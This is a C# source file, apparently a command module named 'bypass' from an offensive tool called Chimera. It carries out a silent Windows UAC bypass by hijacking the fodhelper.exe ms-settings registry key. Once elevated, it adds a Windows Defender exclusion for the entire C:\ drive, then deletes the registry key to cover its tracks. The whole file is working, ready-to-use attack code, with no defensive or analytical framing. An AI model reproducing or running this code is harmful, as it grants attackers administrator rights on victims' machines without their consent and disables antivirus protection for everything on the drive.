using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // bypass — silent UAC elevation via fodhelper.exe registry hijack +
    //          automatic Defender exclusion for C:\ after elevation.
    //
    // Usage: bypass
    // If already admin, just adds exclusion. Otherwise, sets registry keys,
    // launches fodhelper.exe, and then the elevated process will add exclusion.
    public static class RunasExec
    {
        public static string Execute(string command)
        {
            // Command parameter ignored (always does the bypass + exclusion)
            try
            {
                // Check current integrity level
                bool isAdmin = IsAdministrator();
                if (isAdmin)
                {
                    // Already admin, add exclusion directly
                    return AddDefenderExclusion();
                }

                // Not admin, perform fodhelper UAC bypass
                // 1. Set registry keys for fodhelper.exe
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command"))
                {
                    if (key == null) return "[error] Could not create registry key.";
                    // DelegateExecute must be present for fodhelper to honor the command
                    key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                    key.SetValue("", @"C:\Windows\System32\cmd.exe /c start cmd.exe /c ""powershell -Command Add-MpPreference -ExclusionPath 'C:\'""", RegistryValueKind.String);
                }

                // 2. Launch fodhelper.exe (it will run the above command as admin without UAC prompt)
                Process.Start("fodhelper.exe");
                System.Threading.Thread.Sleep(3000); // wait for elevation to happen

                // Cleanup registry key
                try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings", true); } catch { }

                return "[+] UAC bypass triggered. If successful, Defender exclusion for C:\\ was added. Check with 'powershell Get-MpPreference | Select ExclusionPath'.";
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }

        private static bool IsAdministrator()
        {
            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
        }

        private static string AddDefenderExclusion()
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "-Command \"Add-MpPreference -ExclusionPath 'C:\\'\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using (var p = Process.Start(psi))
                {
                    string outStr = p.StandardOutput.ReadToEnd();
                    string errStr = p.StandardError.ReadToEnd();
                    p.WaitForExit();
                    if (p.ExitCode == 0)
                        return "[+] Defender C:\\ exclusion added successfully.\n" + outStr;
                    else
                        return "[!] Defender exclusion may have failed (exit " + p.ExitCode + ").\n" + errStr;
                }
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }
    }
}